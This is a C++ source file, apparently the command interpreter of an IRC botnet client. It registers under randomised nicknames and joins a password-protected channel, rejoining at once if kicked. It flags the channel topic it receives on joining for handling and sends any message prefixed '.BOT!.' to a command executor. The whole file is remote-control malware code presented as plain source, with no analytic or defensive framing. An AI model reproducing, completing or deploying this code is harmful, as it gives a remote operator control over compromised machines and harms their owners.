#include "Include.h"
#include "Hell.h"

void CCmd::InterpretCmd(vector <string> iBuffer)
{
	
 if (iBuffer[1].compare("001") == 0) {
		
		BOT->cIRC.SendData("USER %s\r\n",BOT->cIRC.RndNick(BOT->cIRC.cConf.cNick).c_str());
		BOT->cIRC.SendData("NICK %s\r\n",BOT->cIRC.RndNick(BOT->cIRC.cConf.cNick).c_str());
		BOT->cIRC.SendData("JOIN %s %s\r\n",BOT->cIRC.cConf.cChan.c_str(),BOT->cIRC.cConf.cChanPass.c_str());
		
	}   
	else if (iBuffer[0].compare("VERSION") == 0) {
		BOT->cIRC.SendData("MIRCBOT\r\n");
	}
        else if (iBuffer[1].compare("433") == 0) {
		BOT->cIRC.cConf.cRealNick = BOT->cIRC.RndNick(BOT->cIRC.cConf.cNick);
		BOT->cIRC.SendData("NICK %s\r\n",BOT->cIRC.RndNick(BOT->cIRC.cConf.cNick).c_str());
	}
	else if (iBuffer[1].compare("KICK") == 0) {
		if (iBuffer[3].compare(BOT->cIRC.cConf.cRealNick) == 0)
			BOT->cIRC.SendData("JOIN %s %s\r\n",BOT->cIRC.cConf.cChan.c_str(),BOT->cIRC.cConf.cChanPass.c_str());
	}
	else if (iBuffer[0].compare("PING") == 0) {
		iBuffer[0].replace(1,1,"O");
		BOT->cIRC.SendData("%s %s\r\n",iBuffer[0].c_str(),iBuffer[1].c_str());
	}
	else if (iBuffer[1].compare("332") == 0) {
		BOT->hMain.sTopic = true;
		BOT->hMain.sOnJoinTopic = true;
		BOT->hMain.sTemp = iBuffer[0];		
		iBuffer.erase(iBuffer.begin());
	}
	
	if (iBuffer.size() > 3) {
		if (iBuffer[3].compare(1,6,".BOT!.") == 0) 
			BOT->hMain.ExecuteCmd(iBuffer);			
	}
	BOT->hMain.sTopic = true;
}
